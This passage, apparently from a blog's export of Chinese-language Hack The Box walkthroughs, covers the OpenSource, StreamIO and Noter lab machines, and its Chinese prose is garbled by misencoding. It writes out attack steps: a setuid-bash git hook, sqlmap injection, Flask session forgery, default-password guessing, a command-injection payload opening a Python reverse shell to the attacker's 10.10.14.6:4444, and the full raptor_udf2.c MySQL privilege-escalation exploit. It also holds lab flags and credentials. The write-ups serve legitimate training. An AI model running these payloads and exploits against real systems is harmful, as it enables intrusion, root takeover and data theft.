..\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches\n-rw-r--r--  1 dev01 dev01   22 Jun  7 03:09 COMMIT_EDITMSG\n-rw-rw-r--  1 dev01 dev01  269 Jun  7 03:08 config\n-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description\n-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD\n-rw-r--r--  1 dev01 dev01   21 May 16 12:50 HEAD\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 hooks\n-rw-r--r--  1 root  root   845 Jun  7 01:51 index\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 info\ndrwxr-xr-x  3 dev01 dev01 4096 May  4 16:35 logs\ndrwxrwxr-x 44 dev01 dev01 4096 Jun  7 01:51 objects\ndrwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs\n```\nè¿™è¾¹å¯ä»¥æ ¹æ®ä¹‹å‰çš„æ–‡ä»¶æ¥çŒœæµ‹ï¼Œå¯èƒ½å­˜åœ¨ .git/hooks æ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹ç¡®å®å­˜åœ¨ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹\n\n```bash\ndev01@opensource:~/.git/hooks$ cat pre-commit.sample \n#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n        against=HEAD\nelse\n        # Initial commit: diff against an empty tree object\n        against=4b825dc642cb6eb9a060e54bf8d69288fbee4904\nfi\n\n# If you want to allow non-ASCII filenames set this variable to true.\nallownonascii=$(git config --bool hooks.allownonascii)\n\n# Redirect output to stderr.\nexec 1>&2\n\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n        # Note that the use of brackets around a tr range is ok here, (it's\n        # even required, for portability to Solaris 10's /usr/bin/tr), since\n        # the square bracket bytes happen to fall in the designated range.\n        test $(git diff --cached --name-only --diff-filter=A -z $against |\n          LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n        cat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n\nTo be portable it is advisable to rename the file.\n\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n        exit 1\nfi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n```\npre-commit.sample æ–‡ä»¶çœ‹èµ·æ¥å¾ˆæœ‰å¸Œæœ›å•Šï¼Ÿè®©æˆ‘ä»¬ç¨ç¨çš„ä¿®æ”¹ä¸€ä¸‹\n\næˆ‘ä»¬å°† chmod u+s /bin/bash æ·»åŠ åˆ° pre-commit.sample çš„ #!/bn/bash ä¸€è¡Œä¸‹\n\n![](Hackthebox-OpenSource/1a0a0504-eadb-4c09-9cf9-cca79b391d3b.png)\n\næ¥ç€å°† pre-commit.sample æ–‡ä»¶åæ”¹ä¸º pre-commit\n\n```bash\ndev01@opensource:~/.git/hooks$ /bin/bash -p\nbash-4.4# whoami&&id\nroot\nuid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)\n```\nç„¶åè¿›è¡Œåˆ©ç”¨ï¼ŒæˆåŠŸè¸¢æ‹³é“ root æƒé™\n\n```bash\nbash-4.4# cat /root/root.txt\nb6936fa688d43c9d1cc68e6c0fd1971e\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"StreamIO - Hackthebox","url":"/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/","content":"\n# Hackthebox - StreamIO\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-StreamIO/a359c61f-cba2-4888-9bce-7163a14523f4.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-StreamIO/571e549b-aee6-4799-bde8-f3a5c9a87e92.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 13:41 CST\nNmap scan report for 10.10.11.158\nHost is up (0.69s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-17 12:42:04Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n|_ssl-date: 2022-06-17T12:44:06+00:00; +7h00m00s from scanner time.\n| ssl-cert: Subject: commonName=streamIO/countryName=EU\n| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb\n| Not valid before: 2022-02-22T07:03:28\n|_Not valid after:  2022-03-24T07:03:28\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49701/tcp open  msrpc         Microsoft Windows RPC\n49964/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-time: \n|   date: 2022-06-17T12:43:25\n|_  start_date: N/A\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   831.08 ms 10.10.16.1\n2   831.12 ms 10.10.11.158\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 184.57 seconds\n```\n## Http\n![image](Hackthebox-StreamIO/7f6d5482-1245-4af2-87b3-7eb6c08280fc.png)\n\n80 ç«¯å£å°±æ˜¯ä¸€ä¸ª iis é»˜è®¤é¡µé¢ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿\n\n## Https\n![image](Hackthebox-StreamIO/7cb81489-c2af-4a56-a789-49f9918c9d0e.png)\n\nhttps é¡µé¢ä¼šæŠ¥é”™ï¼Œæˆ‘å¾€å›çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸¤ä¸ª DNS \n\n```bash\nDNS:streamIO.htb, DNS:watch.streamIO.htb\n```\næˆ‘ä»¬ç»™æ·»åŠ åˆ° hosts ä¸­\n\n```bash\necho 10.10.11.158 streamIO.htb watch.streamIO.htb >> /etc/hosts\n```\nç„¶åå»è®¿é—®ä¸€ä¸‹ https://streamIO.htb/\n\n![image](Hackthebox-StreamIO/e1550ea9-be81-4a6f-8e71-e9f7c72aa7bf.png)\n\nè¿™è¾¹æœ‰ä¸€ä¸ªç™»å½•é¡µé¢\n\n![image](Hackthebox-StreamIO/bc66f23a-adde-47e5-a8b8-a5a14631456e.png)\n\nçŒœæµ‹å¯èƒ½æ˜¯æœ‰æ³¨å…¥ï¼Œå»å°è¯•ä¸€ä¸‹\n\n# æ¼æ´åˆ©ç”¨\n## SQL æ³¨å…¥\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# sqlmap -u \"https://streamIO.htb/login.php\" --method POST --data \"username=FUZZ&password=FUZZ\" --dbs\n\navailable databases [5]:\n[*] model\n[*] msdb\n[*] STREAMIO\n[*] streamio_backup\n[*] tempdb\n```\nç¡®å®æœ‰ä¸ªæ—¶é—´æ³¨å…¥ï¼Œä¸è¿‡æ˜¯çœŸçš„æ…¢ï¼Œæˆ‘å°±ç›´æ¥æ”¾ç»“æœäº†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# sqlmap -u \"https://streamIO.htb/login.php\" --method POST --data \"username=FUZZ&password=FUZZ\" --batch -D STREAMIO -T users -C username,password --dump\n\n```","tags":["Hackthebox"]},{"title":"Noter - Hackthebox","url":"/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/","content":"\n# Hackthebox - Noter\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Noter/49242766-f992-44fc-9135-7949fb2c6022.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Noter/ea52bbc7-29c8-4f95-a033-7cab8f2bef09.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-05-22 02:50 EDT\nNmap scan report for 10.10.11.160\nHost is up (0.12s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)\n|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)\n|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)\n5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)\n|_http-title: Noter\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=5/22%OT=21%CT=1%CU=41426%PV=Y%DS=2%DC=T%G=Y%TM=6289DD5\nOS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   126.10 ms 10.10.14.1\n2   126.30 ms 10.10.11.160\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 39.63 seconds\n```\n## Http\n![](Hackthebox-Noter/7dbe01f0-60f6-4e5a-920c-53842065ecc1.png)\n\næ­£å¦‚åå­—è®°å½•ï¼Œè¿™æ˜¯ä¸€å°ç¬”è®°ç›¸å…³çš„é¶æœº\n\n![](Hackthebox-Noter/e62c4c4e-800d-4910-af2a-133e3971cd73.png)\n\nè¿™é‡Œç”¨ Wappalyzer å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å° Flask ç›¸å…³çš„é¶æœº\n\n![](Hackthebox-Noter/24094af1-07c1-4ddb-ad25-d6136d66519b.png)\n\nç›´æ¥ç™»é™†æç¤ºçš„æ˜¯ `Invalid credentials` ï¼Œè¿™é‡Œä¹Ÿæœ‰æ³¨å†Œå£ï¼Œå…ˆå»æ³¨å†Œä¸ªè´¦å·çœ‹çœ‹\n\n![](Hackthebox-Noter/f34d5587-7133-429e-907f-0b41e97ed59e.png)\n\n![](Hackthebox-Noter/718e7b0b-4fbe-4cb5-abdf-2b0537ce5738.png)\n\næ³¨å†Œä¸€ä¸ªè´¦å·åï¼Œä½¿ç”¨é”™è¯¯çš„å¯†ç ç™»é™†ï¼Œæç¤ºçš„æ˜¯ `Invalid login` ï¼Œé‚£å°±æ„å‘³ç€ç”¨æˆ·åå¯ä»¥è¢«çˆ†ç ´ï¼Œåœ¨æŠ“ç»§ç»­æŸ¥çœ‹çš„åŒæ—¶ï¼Œæˆ‘ä»¬å…ˆå»çˆ†ç ´ç”¨æˆ·åçœ‹çœ‹\n\nä½¿ç”¨ç”¨æˆ·åå­—å…¸ /usr/share/seclists/Usernames/cirt-default-usernames.txtï¼Œç„¶åä½¿ç”¨ Burp æŠ“åŒ…è¿›è¡Œçˆ†ç ´\n\n![](Hackthebox-Noter/77f4c3ac-9bd0-4c0b-a800-77e6fb4289a9.png)\n\næœ€åå¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·å blue\n\nç„¶åä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·è¿›è¡Œç™»é™†\n\n![](Hackthebox-Noter/5affb9ec-0cce-4e71-addc-0854e5d4e141.png)\n\nå€’æ˜¯æ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿\n\n![](Hackthebox-Noter/82860798-7702-4c98-a8a3-8a448bc11f59.png)\n\ncookie å¤„ å‘ç°äº†ä¸€ä¸ª JWT Tokenï¼Œæ‹¿å»è§£å¯†\n\n![](Hackthebox-Noter/c4c10889-b04a-44b9-be62-cfb99dd2c1a9.png)\n\n# æ¼æ´åˆ©ç”¨\n> [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)\n\næ—¢ç„¶ç¡®å®šæ˜¯ Flask å¹¶ä¸”æœ‰ JWT äº†ï¼Œé‚£å°±å…ˆæš´åŠ›ç ´è§£ JWT Token çš„å¯†é’¥å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Flask-Unsign-master]\nâ””â”€# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibHVjaWZpZWwifQ.YonkHw.yXozzyS_yg75iFARMutm6Be2D64'\n[*] Session decodes to: {'logged_in': True, 'username': 'lucifiel'}\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 17152 attempts\nb'secret123'\n```\næ¥ç€ä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†é’¥ secret123 å’Œç”¨æˆ·å blue å»ç”Ÿæˆä¸€æ®µ JWT Token å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/Flask-Unsign-master]\nâ””â”€# flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'blue'}\" --secret 'secret123'\neyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yonkfg.c45FeiSpfEgpBTGIvOACAJVXKbk\n```\næ¥ç€æ›¿æ¢æˆ‘ä»¬çš„ JWT Token åï¼Œåˆ·æ–°é¡µé¢\n\n![](Hackthebox-Noter/0bc5d4c6-8e6a-46ac-828c-5ffb0f5c5836.png)\n\næˆ‘ä»¬æˆåŠŸè¿›å…¥äº† blue ç”¨æˆ·çš„åå°\n\n![](Hackthebox-Noter/050dc532-2ff3-485e-9056-ead7138cfefe.png)\n\næˆ‘ä»¬æ³¨æ„åˆ°ï¼Œåœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œftp\\_admin ç”¨æˆ·æœ‰ä¸€ä»½ç¬”è®°ï¼Œå¤§æ„æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è®¿é—® FTPï¼Œå¹¶ä¸”ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = blue\npassword = blue@Noter!\n```\nå»ç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.11.160                                                                           \nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:root): blue\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n```\næˆåŠŸç™»é™†äº†\n\n```bash\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1002     1002         4096 May 02 23:05 files\n-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf\n226 Directory send OK.\nftp> get policy.pdf\nlocal: policy.pdf remote: policy.pdf\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for policy.pdf (12569 bytes).\n226 Transfer complete.\n12569 bytes received in 0.00 secs (54.9850 MB/s)\n```\nè¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªåä¸º policy.pdf çš„æ–‡ä»¶ï¼Œç»™ä¸‹è½½ä¸‹æ¥\n\n![](Hackthebox-Noter/6ea11c9f-40e3-40f4-854e-6d1cd51160b4.png)\n\nåœ¨åˆ›å»ºå¯†ç çš„ç¬¬å››æ¡æåˆ°äº†\n\n```bash\nDefault user-password generated by the application is in the format of \"username@site_name!\" (This applies to all your applications)\n```\nè¿™é‡Œçš„æ„æ€æ˜¯ï¼Œé»˜è®¤ç”¨æˆ·å¯†ç çš„æ ¼å¼æ˜¯ username@sie\\_name!\n\næŒ‰ç…§æˆ‘ä»¬å½“å‰çš„æƒ…å†µï¼Œå¹¶ä¸”ç®¡ç†å‘˜æ˜¯ ftp\\_admin çš„æƒ…å†µä¸‹ï¼Œé‚£å°±å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = ftp_admin\npassword = ftp_admin@Noter!\n```\nç»§ç»­ç™»é™† ftp\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.11.160\nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:root): ftp_admin\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n```\nç™»é™†æˆåŠŸ\n\n```bash\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip\n-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip\n226 Directory send OK.\nftp> get app_backup_1635803546.zip\nlocal: app_backup_1635803546.zip remote: app_backup_1635803546.zip\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).\n226 Transfer complete.\n25559 bytes received in 0.13 secs (193.4986 kB/s)\nftp> get app_backup_1638395546.zip\nlocal: app_backup_1638395546.zip remote: app_backup_1638395546.zip\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).\n226 Transfer complete.\n26298 bytes received in 0.13 secs (193.9745 kB/s)\n```\nè¿™é‡Œæœ‰ä¸¤ä¸ª zip æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸‹è½½è§£å‹åï¼Œå‘ç°é‡Œé¢çš„ç»“æ„æ˜¯ä¸€æ ·çš„ï¼Œè¿›è¡Œä¸€ä¸‹æ¯”è¾ƒ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# diff ./1/app.py ./2/app.py   \n17,18c17,18\n< app.config['MYSQL_USER'] = 'root'\n< app.config['MYSQL_PASSWORD'] = 'Nildogg36'\n```\næˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª mysql çš„è´¦å·å¯†ç \n\n```bash\nusername = root\npassword = Nildogg36\n```\n```bash\n                        rand_int = random.randint(1,10000)\n            command = f\"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}\"\n            subprocess.run(command, shell=True, executable=\"/bin/bash\")\n```\nåœ¨ app\\_backup\\_1638395546.zip çš„ [app.py](http://app.py) çš„ç¬¬ 283 è¡Œï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ª RCE æ¼æ´\n\nå¡«å…¥æˆ‘ä»¬çš„ Shell è¯­å¥\n\n```bash\nurl = request.form['url']\n\n            status, error = parse_url(url)\n\n            if (status is True) and (error is None):\n                try:\n                    r = pyrequest.get(url,allow_redirects=True)\n                    rand_int = random.randint(1,10000)\n                    command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"\n                    subprocess.run(command, shell=True, executable=\"/bin/bash\")\n```\né€šè¿‡è¿™éƒ¨åˆ†ä»£ç ï¼Œæˆ‘ä»¬æ„é€ äº†ä¸€æ®µ POC\n\næˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º [exploit.md](http://exploit.md) çš„æ–‡ä»¶\n\n```bash\n';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' # '\n```\næ¥ç€ä½¿ç”¨ NC ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\n```\nç„¶åä½¿ç”¨ python3 æ‰“å¼€ä¸€ä¸ª http æœåŠ¡\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\nç„¶åå»é¡µé¢ä¸Šè®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Noter/f7b6070e-6a2f-4877-abad-d8d819ea6510.png)\n\n![](Hackthebox-Noter/0923d419-71e3-4c98-9574-4de9e2439cb1.png)\n\nå¡«å…¥æˆ‘ä»¬çš„ shell åœ°å€ï¼Œç„¶åæ‰§è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.11.160] 53994\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\"\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nsvc@noter:~/app/web$ whoami&&id\nwhoami&&id\nsvc\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™\n\n```bash\nsvc@noter:/home$ cat /home/svc/user.txt\ncat /home/svc/user.txt\ned6e3a8ea6c35a17e3d63a425cb95c11\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\næˆ‘ä»¬ä¹‹å‰è·å¾—è¿‡ä¸€ä¸ª mysql çš„å‡­è¯ï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªæç¤ºï¼Œå»çœ‹çœ‹è¿›ç¨‹\n\n```bash\nsvc@noter:~/app/web$ mysql -V\nmysql -V\nmysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2\n```\nå’±ä»¬çŸ¥é“äº† mysql çš„ç‰ˆæœ¬ï¼Œç„¶åæœç´¢ä¸€ä¸‹ mysql udf\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit mysql udf\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nMySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                      | linux/local/1181.c\nMySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                     | linux/local/1518.c\nMySQL 4/5/6 - UDF for Command Execution                                                                     | linux/local/7856.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n```\nåº”è¯¥æ˜¯ç¬¬äºŒä¸ªäº†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# locate linux/local/1518.c\n/usr/share/exploitdb/exploits/linux/local/1518.c\n```\næŠŠ exp ç»™ä¿å­˜åˆ°æ¡Œé¢\n\n```bash\n/*\n * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $\n *\n * raptor_udf2.c - dynamic library for do_system() MySQL UDF\n * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>\n *\n * This is an helper dynamic library for local privilege escalation through\n * MySQL run with root privileges (very bad idea!), slightly modified to work \n * with newer versions of the open-source database. Tested on MySQL 4.1.14.\n *\n * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c\n *\n * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes\n * for the security vulnerabilities in the handling of User Defined Functions\n * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further\n * details, please refer to:\n *\n * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html\n * http://www.wisec.it/vulns.php?page=4\n * http://www.wisec.it/vulns.php?page=5\n * http://www.wisec.it/vulns.php?page=6\n *\n * \"UDFs should have at least one symbol defined in addition to the xxx symbol \n * that corresponds to the main xxx() function. These auxiliary symbols \n * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and \n * xxx_add() functions\". -- User Defined Functions Security Precautions \n *\n * Usage:\n * $ id\n * uid=500(raptor) gid=500(raptor) groups=500(raptor)\n * $ gcc -g -c raptor_udf2.c\n * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n * $ mysql -u root -p\n * Enter password:\n * [...]\n * mysql> use mysql;\n * mysql> create table foo(line blob);\n * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\n * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\n * mysql> create function do_system returns integer soname 'raptor_udf2.so';\n * mysql> select * from mysql.func;\n * +-----------+-----+----------------+----------+\n * | name      | ret | dl             | type     |\n * +-----------+-----+----------------+----------+\n * | do_system |   2 | raptor_udf2.so | function |\n * +-----------+-----+----------------+----------+\n * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');\n * mysql> \\! sh\n * sh-2.05b$ cat /tmp/out\n * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n * [...]\n *\n * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys\n *\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n\nenum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};\n\ntypedef struct st_udf_args {\n    unsigned int        arg_count;    // number of arguments\n    enum Item_result    *arg_type;    // pointer to item_result\n    char             **args;        // pointer to arguments\n    unsigned long        *lengths;    // length of string args\n    char            *maybe_null;    // 1 for maybe_null args\n} UDF_ARGS;\n\ntypedef struct st_udf_init {\n    char            maybe_null;    // 1 if func can return NULL\n    unsigned int        decimals;    // for real functions\n    unsigned long         max_length;    // for string functions\n    char            *ptr;        // free ptr for func data\n    char            const_item;    // 0 if result is constant\n} UDF_INIT;\n\nint do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)\n{\n    if (args->arg_count != 1)\n        return(0);\n\n    system(args->args[0]);\n\n    return(0);\n}\n\nchar do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)\n{\n    return(0);\n}\n\n// milw0rm.com [2006-02-20]\n```\nå¾ˆå®Œå–„çš„ exp å•Šï¼Œè¿˜ç»™äº†æ•™ç¨‹\n\næˆ‘ä»¬æŠŠ exp ä¸Šä¼ 